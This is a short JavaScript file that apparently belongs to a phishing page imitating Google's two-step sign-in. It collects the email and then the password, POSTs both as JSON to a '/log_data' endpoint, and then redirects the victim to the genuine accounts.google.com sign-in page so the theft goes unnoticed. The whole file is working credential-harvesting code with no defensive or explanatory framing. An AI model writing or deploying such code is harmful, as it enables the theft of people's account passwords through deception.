document.addEventListener("DOMContentLoaded", function () {
    const nextBtn = document.getElementById("next-btn");
    const loginBtn = document.getElementById("login-btn");
    const emailStep = document.getElementById("email-step");
    const passwordStep = document.getElementById("password-step");
    const emailInput = document.getElementById("email-input");
    const emailDisplay = document.getElementById("email-display");

    let userData = {};

    // Move to password step
    nextBtn.addEventListener("click", function () {
        const email = emailInput.value.trim();
        if (email) {
            emailDisplay.textContent = email; // Show email
            emailStep.classList.add("hidden");
            passwordStep.classList.remove("hidden");
            userData.email = email;
        }
    });

    // Go back to email step
    document.querySelector("#password-step a").addEventListener("click", function (event) {
        event.preventDefault();
        passwordStep.classList.add("hidden");
        emailStep.classList.remove("hidden");
    });

    // Handle login (Send email & password to server)
    loginBtn.addEventListener("click", function () {
        const password = document.getElementById("password-input").value;

        if (password) {
            userData.password = password;

            fetch("/log_data", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(userData)
            })
            .then(response => {
                if (response.ok) {
                    window.location.href = "https://accounts.google.com/signin"; // Redirect
                } else {
                    console.error("Logging failed");
                }
            })
            .catch(error => console.error("Error:", error));
        }
    });
});
